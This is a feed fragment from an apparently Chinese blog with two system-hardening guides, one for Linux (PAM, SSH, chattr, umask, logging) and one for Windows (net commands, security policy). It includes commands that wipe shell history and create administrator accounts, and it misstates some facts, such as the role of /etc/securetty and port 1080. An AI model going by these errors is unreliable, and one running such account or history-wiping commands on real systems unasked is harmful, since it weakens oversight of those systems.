plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;login.defs</span><br><span class="line"></span><br><span class="line">PASS_MAX_DAYS   90  &#x2F;&#x2F;用户的密码最长使用天数</span><br><span class="line">PASS_MIN_DAYS   0   &#x2F;&#x2F;两次修改密码的最小时间间隔</span><br><span class="line">PASS_MIN_LEN    7   &#x2F;&#x2F;密码的最小长度</span><br><span class="line">PASS_WARN_AGE   9   &#x2F;&#x2F;密码过期前多少天开始提示</span><br></pre></td></tr></table></figure><h2 id="禁用root之外的超级用户"><a href="#禁用root之外的超级用户" class="headerlink" title="禁用root之外的超级用户"></a>禁用root之外的超级用户</h2><p>检测方法（检查id为0的用户）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F &quot;:&quot; &#39;($3&#x3D;&#x3D;&quot;0&quot;)&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101511.png" alt="image"></p><p>加固方法：<br>使用命令<code>passwd -l &lt;用户名&gt;</code>锁定用户</p><h2 id="限制能够su为root的用户"><a href="#限制能够su为root的用户" class="headerlink" title="限制能够su为root的用户"></a>限制能够su为root的用户</h2><p>使用命令<code>cat /etc/pam.d/su</code>查看是否有<code>auth required /lib/security/pam_wheel.so</code>这样的配置条目</p><p>加固方法：（在头部添加）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth required &#x2F;lib&#x2F;security&#x2F;pam_wheel.so group&#x3D;wheel</span><br></pre></td></tr></table></figure><p>这样，只有wheel组的用户可以su到root</p><p><img src="https://qiniu.hzktester.top/tp2020101512.png" alt="image"></p><h2 id="重要文件加上不可改变属性"><a href="#重要文件加上不可改变属性" class="headerlink" title="重要文件加上不可改变属性"></a>重要文件加上不可改变属性</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chattr +i &#x2F;etc&#x2F;passwd</span><br><span class="line">chattr +i &#x2F;etc&#x2F;shadow</span><br><span class="line">chattr +i &#x2F;etc&#x2F;gshadow</span><br><span class="line">chattr +i &#x2F;etc&#x2F;group</span><br><span class="line">chattr +i &#x2F;etc&#x2F;inetd.conf</span><br><span class="line">chattr +i &#x2F;etc&#x2F;httpd.conf</span><br></pre></td></tr></table></figure><h2 id="Umask安全"><a href="#Umask安全" class="headerlink" title="Umask安全"></a>Umask安全</h2><p><img src="https://qiniu.hzktester.top/tp2020101513.png" alt="image"></p><blockquote><p>第一个0代表suid 丢弃的权限；<br>第二个0代表本文件/目录拥有者什么权限都没丢弃<br>第三个2代表本文件/目录的用户组丢弃了w权限<br>第四个2代表本文件/目录的其他用户能使用的权限只有有r和x</p></blockquote><p>实际权限=<strong>7777-0022</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">umask 0022</span><br></pre></td></tr></table></figure><h2 id="ssh安全"><a href="#ssh安全" class="headerlink" title="ssh安全"></a>ssh安全</h2><p>禁止root用户进行远程登录<br>检查方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config | grep PermitRootLogin是否为no</span><br></pre></td></tr></table></figure><p>加固方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure><p>更改服务端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">Port 2222   &#x2F;&#x2F;更改ssh端口</span><br></pre></td></tr></table></figure><h2 id="屏蔽SSH登录banner信息"><a href="#屏蔽SSH登录banner信息" class="headerlink" title="屏蔽SSH登录banner信息"></a>屏蔽SSH登录banner信息</h2><p>检查方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config | grep banner</span><br><span class="line">&#x2F;&#x2F;查看文件中是否存在banner字段，或banner字段为NONE</span><br><span class="line">cat &#x2F;etc&#x2F;motd</span><br><span class="line">查看文件内容，该处内容作为banner信息显示给登录用户</span><br></pre></td></tr></table></figure><p>加固方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure><p>添加<code>banner NONE</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;motd</span><br></pre></td></tr></table></figure><p>删除全部内容或更新成自己想要添加的内容</p><p><img src="https://qiniu.hzktester.top/tp2020101514.png" alt="image"></p><h2 id="仅允许SSH协议版本2"><a href="#仅允许SSH协议版本2" class="headerlink" title="仅允许SSH协议版本2"></a>仅允许SSH协议版本2</h2><blockquote><p>有两个SSH协议版本，仅使用SSH协议版本2会更安全，SSH协议版本1有安全问题，包括中间人攻击<br>（man-in-the-middle）和注入（insertion）攻击。</p></blockquote><p>编辑<code>/etc/ssh/sshd_config</code>文件并查找下面这样的行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Protocol 2,1</span><br><span class="line">修改为</span><br><span class="line">Protocol 2</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101515.png" alt="image"></p><h2 id="防止误使用Ctrl-Alt-Del重启系统"><a href="#防止误使用Ctrl-Alt-Del重启系统" class="headerlink" title="防止误使用Ctrl+Alt+Del重启系统"></a>防止误使用Ctrl+Alt+Del重启系统</h2><p>检查方法（查看输出行是否被注释）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;inittab |grep ctrl-alt-del</span><br><span class="line">Ctrl-Alt-Delete is handled by &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;ctrl-alt-del.target</span><br></pre></td></tr></table></figure><p>加固方法（在行开否添加注释符号“#”）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;inittab</span><br><span class="line"># Ctrl-Alt-Delete is handled by &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;ctrl-alt-del.target</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101516.png" alt="image"></p><h2 id="设置账户锁定登录失败锁定次数、锁定时间"><a href="#设置账户锁定登录失败锁定次数、锁定时间" class="headerlink" title="设置账户锁定登录失败锁定次数、锁定时间"></a>设置账户锁定登录失败锁定次数、锁定时间</h2><p>检查方法（查看有无<code>auth required pam_tally2.so</code>条目的设置）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;pam.d&#x2F;system-auth|grep auth </span><br></pre></td></tr></table></figure><p>加固方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;pam.d&#x2F;system-auth</span><br><span class="line"></span><br><span class="line">auth required pam_tally2.so onerr&#x3D;fail deny&#x3D;3 unlock_time&#x3D;30 even_deny_root root_unlock_time&#x3D;100</span><br></pre></td></tr></table></figure><p>设置为密码连续错误3次锁定，锁定时间30秒。root密码连续错误3次锁定，时间为 100秒<br><img src="https://qiniu.hzktester.top/tp2020101517.png" alt="image"></p><h2 id="修改账户TMOUT值，设置自动注销时间"><a href="#修改账户TMOUT值，设置自动注销时间" class="headerlink" title="修改账户TMOUT值，设置自动注销时间"></a>修改账户TMOUT值，设置自动注销时间</h2><p>检查方法（查看有无TMOUT的设置）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;profile|grep TMOUT </span><br></pre></td></tr></table></figure><p>加固方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br><span class="line">TMOUT&#x3D;600  &#x2F;&#x2F;增加条目。无操作600秒后自动退出</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101518.png" alt="image"></p><h2 id="设置BASH保留历史命令的条目"><a href="#设置BASH保留历史命令的条目" class="headerlink" title="设置BASH保留历史命令的条目"></a>设置BASH保留历史命令的条目</h2><p>检查方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;profile | grep HISTSIZE</span><br></pre></td></tr></table></figure><p>加固方法（修改HISTSIZE=5即保留最新执行的5条命令<br>）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101519.png" alt="image"></p><h2 id="用户注销时删除命令记录"><a href="#用户注销时删除命令记录" class="headerlink" title="用户注销时删除命令记录"></a>用户注销时删除命令记录</h2><p>检查方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;skel&#x2F;.bash_logout</span><br></pre></td></tr></table></figure><p>增加如下行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;skel&#x2F;.bash_logout</span><br><span class="line">rm -f $HOME&#x2F;.bash_history</span><br></pre></td></tr></table></figure><p>这样，系统中的所有用户注销时都会删除其命令记录，如果只需要针对某个特定用户，如root用户进行设置，则可只在该用户的主目录下修改<code>/$HOME/.bash_history</code>文件增加相同的一行即可。</p><p><img src="https://qiniu.hzktester.top/tp2020101520.png" alt="image"></p><h2 id="设置系统日志策略配置文件"><a href="#设置系统日志策略配置文件" class="headerlink" title="设置系统日志策略配置文件"></a>设置系统日志策略配置文件</h2><p>日志的主要用途是<strong>系统审计、监测追踪和分析统计</strong>。<br>为了保证 Linux 系统正常运行、准确解决遇到的各种各样的系统问题，认真地读取日志文件是管理员的一项非常重要的任务。UNIX/Linux采用了syslog工具来实现此功能，如果配置正确的话，所有在主机上发生的事情都会被记录下来，不管是好的还是坏的。</p><p>检查方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps -aef | grep syslog   &#x2F;&#x2F;确定syslog服务是否启用</span><br><span class="line">cat &#x2F;etc&#x2F;rsyslog.conf   &#x2F;&#x2F;查看syslogd的配置文件</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;messages   &#x2F;&#x2F;查看系统日志</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;cron       &#x2F;&#x2F;查看cron日志</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;secure     &#x2F;&#x2F;查看安全日志</span><br></pre></td></tr></table></figure><p>详细配置文件的说明可以参考这篇博客：<br><a href="https://www.cnblogs.com/lizhouwei/p/10134049.html">https://www.cnblogs.com/lizhouwei/p/10134049.html</a></p><h2 id="阻止系统响应任何从外部-内部来的ping请求"><a href="#阻止系统响应任何从外部-内部来的ping请求" class="headerlink" title="阻止系统响应任何从外部/内部来的ping请求"></a>阻止系统响应任何从外部/内部来的ping请求</h2><p>加固方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all</span><br></pre></td></tr></table></figure><p>执行以上命令，其他客户端就不能ping通服务器了</p><p><img src="https://qiniu.hzktester.top/tp2020101521.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Linux系统基本操作&quot;&gt;&lt;a href=&quot;#Linux系统基本操作&quot; class=&quot;headerlink&quot; title=&quot;Linux系统基本操作&quot;&gt;&lt;/a&gt;Linux系统基本操作&lt;/h1&gt;&lt;h2 id=&quot;文件结构图及关键文件功能&quot;&gt;&lt;a href=&quot;#文件结构图及关键文件功能&quot; class=&quot;headerlink&quot; title=&quot;文件结构图及关键文件功能&quot;&gt;&lt;/a&gt;文件结构图及关键文件功能&lt;/h2&gt;&lt;h3 id=&quot;Linux文件结构&quot;&gt;&lt;a href=&quot;#Linux文件结构&quot; class=&quot;headerlink&quot; title=&quot;Linux文件结构&quot;&gt;&lt;/a&gt;Linux文件结构&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020101501.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;Linux文件结构图&quot;&gt;&lt;a href=&quot;#Linux文件结构图&quot; class=&quot;headerlink&quot; title=&quot;Linux文件结构图&quot;&gt;&lt;/a&gt;Linux文件结构图&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020101502.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;二级目录&quot;&gt;&lt;a href=&quot;#二级目录&quot; class=&quot;headerlink&quot; title=&quot;二级目录&quot;&gt;&lt;/a&gt;二级目录&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;目录&lt;/th&gt;
&lt;th&gt;功能&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;/bin&lt;/td&gt;
&lt;td&gt;放置的是在单人维护模式下能够被操作的指令，在/bin底下的指令可以被root与 一般账号所使用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/boot&lt;/td&gt;
&lt;td&gt;这个目录只要在放置开机会使用到的文件，包括Linux核心文件以及开机选单与 开机所需配置的文件等等&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/dev&lt;/td&gt;
&lt;td&gt;在Linux系统上，任何装置与接口设备都是以文件的形态存在于这个目录当中的&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc&lt;/td&gt;
&lt;td&gt;系统主要的配置文件几乎都放置在这个目录内，例如人员的账号密码文件，各 种服务的启动档，系统变量配置等&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/home&lt;/td&gt;
&lt;td&gt;这是系统默认的用户家目录(homedirectory)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/lib&lt;/td&gt;
&lt;td&gt;/lib放置的则是在开机时会用到的函式库，以及在/lib或/sbin底下的指令会呼叫 的函式库&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/media&lt;/td&gt;
&lt;td&gt;/media底下放置的是可移出的装置，包括软盘、光盘、DVD等等装置都杂事挂载与此&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/opt&lt;/td&gt;
&lt;td&gt;给第三方协议软件放置的目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/root&lt;/td&gt;
&lt;td&gt;系统管理员（root）的家目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/sbin&lt;/td&gt;
&lt;td&gt;放置/sbin底下的为开机过程中所需要的，里面包括了开机、修复、还原系统所 需要的指令。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/srv&lt;/td&gt;
&lt;td&gt;srv可视为[service]的缩写，是一些网络服务启动之后，这些服务所需要取用的 数据目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/tmp&lt;/td&gt;
&lt;td&gt;这是让一般使用者或者是正在执行的程序暂时放置文件的地方&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&quot;文件&quot;&gt;&lt;a href=&quot;#文件&quot; class=&quot;headerlink&quot; title=&quot;文件&quot;&gt;&lt;/a&gt;文件&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;目录&lt;/th&gt;
&lt;th&gt;功能&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;/etc/passwd&lt;/td&gt;
&lt;td&gt;记录系统本地用户的属性信息，如UId,Gid,家目录等信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc/shadow&lt;/td&gt;
&lt;td&gt;存放用户的口令等信息，只有系统管理员用户能查看&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc/pam.d/system-auth&lt;/td&gt;
&lt;td&gt;账户安全配置文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc/login.defs&lt;/td&gt;
&lt;td&gt;设置用户账户限制的配置文件，对root用户无效&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc/securetty&lt;/td&gt;
&lt;td&gt;网络配置文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc/pam.d/su&lt;/td&gt;
&lt;td&gt;su命令配置&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc/hosts.allow、/etc/hosts.deny&lt;/td&gt;
&lt;td&gt;允许/拒接某网段远程连接到主机&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/etc/profile&lt;/td&gt;
&lt;td&gt;保存Linux全局环境变量信息，如umask,bash历史命令设置&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;</summary>
    
    
    
    <category term="安全加固" scheme="https://hzktester.top/categories/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
    
    <category term="linux系统加固" scheme="https://hzktester.top/tags/linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>windows操作系统加固</title>
    <link href="https://hzktester.top/posts/c63e133.html"/>
    <id>https://hzktester.top/posts/c63e133.html</id>
    <published>2020-10-14T06:29:00.000Z</published>
    <updated>2020-10-20T09:21:51.045Z</updated>
    
    <content type="html"><![CDATA[<h1 id="windows系统基本操作"><a href="#windows系统基本操作" class="headerlink" title="windows系统基本操作"></a>windows系统基本操作</h1><h2 id="windows常见目录"><a href="#windows常见目录" class="headerlink" title="windows常见目录"></a>windows常见目录</h2><table><thead><tr><th>路径</th><th>作用</th></tr></thead><tbody><tr><td>C:\Windows\System32</td><td>存放系统配置文件</td></tr><tr><td>C:\Windows\SysWOW64</td><td>Windows操作系统的子系统</td></tr><tr><td>C:\Windows\System32\config\SAM</td><td>存放windows帐号和密码</td></tr><tr><td>C:\Windows\System32\drivers\etc\hosts</td><td>DNS解析文件</td></tr><tr><td>C:\Program Files、C:\Program Files (x86)</td><td>64位系统安装在Windows操作系统的子系统,32位下会安装在x86下</td></tr><tr><td>C:\Windows\System32\winevt\Logs</td><td>日志目录</td></tr></tbody></table><h2 id="windows常用系统命令"><a href="#windows常用系统命令" class="headerlink" title="windows常用系统命令"></a>windows常用系统命令</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>ver</td><td>查看系统版本</td></tr><tr><td>hostname</td><td>查看主机名</td></tr><tr><td>ipconfig /all</td><td>查看网络配置</td></tr><tr><td>net user/localgroup/share/config</td><td>查看用户/用户组/共享/当前运行可配置服务</td></tr><tr><td>at</td><td>建立或查看系统作业</td></tr><tr><td>netstat</td><td>查看开放端口</td></tr><tr><td>secpol.msc</td><td>查看和修改本地安全设置</td></tr><tr><td>services.msc</td><td>查看和修改服务</td></tr><tr><td>eventvwr.msc</td><td>查看日志</td></tr><tr><td>regedit</td><td>打开注册表</td></tr><tr><td>whoami</td><td>查看当前操作用户的用户名</td></tr></tbody></table><h2 id="windows常见端口"><a href="#windows常见端口" class="headerlink" title="windows常见端口"></a>windows常见端口</h2><table><thead><tr><th>端口</th><th>说明</th></tr></thead><tbody><tr><td>80/8080/8081</td><td>HTTP协议代理服务器常用端口号</td></tr><tr><td>443</td><td>HTTPS协议代理服务器常用端口号</td></tr><tr><td>21</td><td>FTP(文件传输协议)协议代理服务器常用端口号</td></tr><tr><td>23</td><td>Telnet(远程登录)协议代理服务器常用端口号</td></tr><tr><td>22</td><td>SSH（安全登录）、SCP（文件传输）</td></tr><tr><td>1521</td><td>Oracle 数据库</td></tr><tr><td>1433</td><td>MS SQL SERVER数据库</td></tr><tr><td>1080</td><td>QQ</td></tr><tr><td>3306</td><td>Mysql数据库</td></tr><tr><td>25</td><td>SMTP（简单邮件传输协议）</td></tr></tbody></table><h2 id="net命令的使用"><a href="#net命令的使用" class="headerlink" title="net命令的使用"></a>net命令的使用</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>net user abc /add</td><td>创建（空密码）账户abc</td></tr><tr><td>net user abc</td><td>查看账户abc的详细信息</td></tr><tr><td>net user abc /del</td><td>删除账户abc</td></tr><tr><td>net user abc 123/add</td><td>创建普通账户abc，密码为123</td></tr><tr><td>net localgroup administrators abc /add</td><td>把abc用户加入管理员组</td></tr><tr><td>net localgroup administrators abc /del</td><td>把abc用户退出管理员组</td></tr><tr><td>net user abc /active:yes[no]</td><td>启用[停用]abc账户</td></tr><tr><td>net localgroup admin /add[del]</td><td>新建[删除]组admin</td></tr><tr><td>net share</td><td>查看本地开启的共享</td></tr><tr><td>netstat</td><td>查看开启哪些端口</td></tr></tbody></table><h1 id="windows系统加固"><a href="#windows系统加固" class="headerlink" title="windows系统加固"></a>windows系统加固</h1><p>账号安全是计算机系统安全的第一关，如果计算机系统账号被盗用，那<br>么计算机将非常危险，入侵者可以任意控制计算机系统，如果计算机中存在<br>着重要的机密文件，或者银行卡号和密码，那么损失会非常严重。</p><h2 id="账号及安全策略"><a href="#账号及安全策略" class="headerlink" title="账号及安全策略"></a>账号及安全策略</h2><p>账号安全设置方法：</p><p>“开始”—“运行”输入<code>secpol.msc</code>（控制面板——系统和安全——管理工具）</p><p>账号锁定策略：</p><p><img src="https://qiniu.hzktester.top/tp2020101401.png" alt="image"></p><p>账号密码策略：</p><p><img src="https://qiniu.hzktester.top/tp2020101402.png" alt="image"></p><h2 id="禁用Guest账户权限"><a href="#禁用Guest账户权限" class="headerlink" title="禁用Guest账户权限"></a>禁用Guest账户权限</h2><p>我的电脑—右击—管理—计算机管理—本地用户和组—用户—Guest—右键—属性—<br>常规—选择“账户已禁用”。</p><p><img src="https://qiniu.hzktester.top/tp2020101403.png" alt="image"></p><p>或使用命令<code>net user guest /active:no</code>(cmd管理员模式执行)</p><h2 id="Administartor账号、组重命名"><a href="#Administartor账号、组重命名" class="headerlink" title="Administartor账号、组重命名"></a>Administartor账号、组重命名</h2><p><code>Administartor</code>账号、组重命名，可增加账号安全性</p><p><img src="https://qiniu.hzktester.top/tp2020101404.png" alt="image"></p><p><img src="https://qiniu.hzktester.top/tp2020101405.png" alt="image"></p><h2 id="日志及审核策略"><a href="#日志及审核策略" class="headerlink" title="日志及审核策略"></a>日志及审核策略</h2><p>“开始”—“运行”输入<code>secpol.msc</code>（控制面板——系统和安全——管理工具）</p><p>对重要事件进行审核记录，方便日后出现问题时查找问题根源。</p><p><img src="https://qiniu.hzktester.top/tp2020101406.png" alt="image"></p><h3 id="调整事件日志的大小及覆盖策略"><a href="#调整事件日志的大小及覆盖策略" class="headerlink" title="调整事件日志的大小及覆盖策略"></a>调整事件日志的大小及覆盖策略</h3><p>设置方法：“开始”—“运行”输入<code>eventvwr.msc</code></p><p>增大日志大小，避免由于日志文件容量过小导致重要日志记录遗漏</p><table><thead><tr><th>日志类型</th><th>日志大小</th><th>覆盖策略</th></tr></thead><tbody><tr><td>应用程序</td><td>80000KB</td><td>覆盖早于30天的日志</td></tr><tr><td>安全日志</td><td>80000KB</td><td>覆盖早于30天的日志</td></tr><tr><td>系统日志</td><td>80000KB</td><td>覆盖早于30天的日志</td></tr></tbody></table><p><img src="https://qiniu.hzktester.top/tp2020101407.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020101408.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020101409.png" alt="image"></p><blockquote><p>在一个完整的信息系统里面，日志系统是一个非常重要的功能组成部分。<br>它可以记录下系统所产生的所有行为，并按照某种规范表达出来。我们可以<br>使用日志系统所记录的信息为系统进行排错，优化系统的性能，或者根据这<br>些信息调整系统的行为。在安全领域，日志系统的重要地位尤甚，可以说是<br>安全审计方面最主要的工具之一。</p></blockquote><h2 id="安全选项策略设置"><a href="#安全选项策略设置" class="headerlink" title="安全选项策略设置"></a>安全选项策略设置</h2><p>本地安全策略-&gt;本地策略-&gt;安全选项</p><h3 id="Microsoft-网络服务器"><a href="#Microsoft-网络服务器" class="headerlink" title="Microsoft 网络服务器"></a>Microsoft 网络服务器</h3><ul><li><p>Microsoft 网络服务器：登录时间过期后断开与客户端的连接（启用）</p><blockquote><p>目的：可以避免用户在不适合的时间登录到系统,或者用户登录到系统后忘记退出登录</p></blockquote></li><li><p>Microsoft 网络服务器：暂停会话前所需的空闲时间数量（小于30分钟）</p><blockquote><p>目的：设置挂起会话之前所需的空闲时间为30分钟    </p></blockquote></li><li><p>Microsoft 网络客户端：将未加密的密码发送到第三方SMB服务期（禁用）</p><blockquote><p>目的：禁止发送未加密的密码到第三方SMB服务器</p></blockquote><p>  <img src="https://qiniu.hzktester.top/tp2020101410.png" alt="image"></p><h3 id="恢复控制台"><a href="#恢复控制台" class="headerlink" title="恢复控制台"></a>恢复控制台</h3></li><li><p>恢复控制台:允许软盘复制并访问所有驱动器和所有文件夹（禁用）</p><blockquote><p>目的：禁止它访问硬盘驱动器上的所有文件和目录。它仅允许访问每个卷的根目录%systemroot%目录及子目录，即使是这样它还限制不允许把硬盘驱动器上的文件拷贝到软盘上</p></blockquote></li><li><p>恢复控制台:允许自动系统管理级登录（禁用）</p><blockquote><p>目的：恢复控制台是Windows 2003的一个新特性，它在一个不能启动的系统上给出一个受限的命令行访问界面。可能会导致任何可以重起系统的人绕过账号口令限制和其它安全设置而访问系统</p></blockquote><p>  <img src="https://qiniu.hzktester.top/tp2020101411.png" alt="image"></p><h3 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h3></li><li><p>关机：清除虚拟内存页面文件（启用）</p><blockquote><p>目的：某些第三方的程序可能把一些没有加密的密码存在内存中，页面文件中也可能含有另外一些敏感的资料。关机的时候清除页面文件，防止造成意外的信息泄漏</p></blockquote></li><li><p>关机：允许系统在未登录的情况下关机（禁用）</p><blockquote><p>目的：防止连接远程桌面后恶意关机计算机</p></blockquote><p>  <img src="https://qiniu.hzktester.top/tp2020101412.png" alt="image"></p><h3 id="交互式登录"><a href="#交互式登录" class="headerlink" title="交互式登录"></a>交互式登录</h3></li><li><p>交互式登录：登陆时不显示用户名（启用）</p><blockquote><p>目的：登录时不显示上次登录的用户名，防止暴露用户名。</p></blockquote></li><li><p>交互式登录：无需按Ctrl+Alt+Del（禁用）</p><blockquote><p>目的：登录时需要按CTRL+ALT+DEL</p></blockquote></li><li><p>交互式登录：之前登录到缓存的次数（域控制器不可用时），设置为0</p><blockquote><p>目的：登陆时不显示上次的用户名，防止暴露用户名</p></blockquote><p>  <img src="https://qiniu.hzktester.top/tp2020101413.png" alt="image"></p><h3 id="审核"><a href="#审核" class="headerlink" title="审核"></a>审核</h3></li><li><p>审核：如果无法记录安全审核则立即关闭系统</p></li><li><p>审核：对全局系统对象的访问进行审核（启用）</p><p>  <img src="https://qiniu.hzktester.top/tp2020101414.png" alt="image"></p><h3 id="网络访问"><a href="#网络访问" class="headerlink" title="网络访问"></a>网络访问</h3></li><li><p>网络访问：不允许SAM帐户和共享的匿名枚举（启用）</p><blockquote><p>目的：禁止使用匿名用户空连接枚举系统敏感信息</p></blockquote></li><li><p>网络访问：不允许存储网络身份验证和密码和凭据（启用）</p></li><li><p>网络访问：本地账户的共享和安全模型（仅来宾–本地账户以来宾用户身份验证）</p></li><li><p>网络访问：可匿名访问的共享（全部删除）</p></li><li><p>网络访问：可匿名访问的命名管道 